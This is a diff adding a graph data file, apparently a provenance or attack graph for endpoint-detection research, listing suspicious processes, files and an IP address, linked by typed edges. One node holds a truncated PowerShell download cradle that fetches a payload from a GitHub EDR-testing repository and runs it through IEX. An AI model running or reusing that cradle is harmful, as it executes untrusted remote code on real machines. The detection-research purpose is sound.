@@ -1,0 +1,63 @@
+15
+MP*-wbengine.exe
+MF-\System32\notepad.exe
+SO-https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_
+MF-\Users\admin\AppData\Local\Temp\nsf91FB.tmp\ns9DCC.tmp
+TP*-468C.exe
+MP*-snuvcdsm.exe 
+SO-8.100.0.203
+TF-C:\Users\Public\Videos\videotv.m3u
+TP*-Group unlock - Linkvertise Downloader_LIT-Qg1.exe 
+TF-C:\Users\admin\AppData\Local\Temp\bozon.exe
+TP-MsBuild.exe
+SF-C:\Windows\system32\WerFault
+SF-C:\Program Files\Internet Explorer\iexplore.exe
+TP-Order specification.exe
+MP-findstr.exe
+45
+0 1 WR
+2 0 RF
+0 3 EX
+0 4 IJ
+4 1 RD
+2 4 RF
+4 3 RD
+0 5 FR
+5 1 WR
+5 2 ST
+5 3 RD
+4 5 IJ
+6 0 RF
+4 6 ST
+5 6 ST
+0 7 WR
+4 7 EX
+5 7 CD
+0 8 IJ
+8 1 EX
+2 8 RF
+8 3 WR
+4 8 IJ
+5 8 IJ
+6 8 RF
+8 7 UK
+0 9 WR
+4 9 CD
+5 9 CD
+0 10 FR
+10 1 RD
+2 10 RF
+10 3 WR
+4 10 IJ
+5 10 UK
+4 11 WR
+4 12 UK
+13 3 WR
+13 6 ST
+13 9 WR
+13 11 WR
+6 14 RF
+14 9 EX
+14 11 WR
+13 14 UK
+
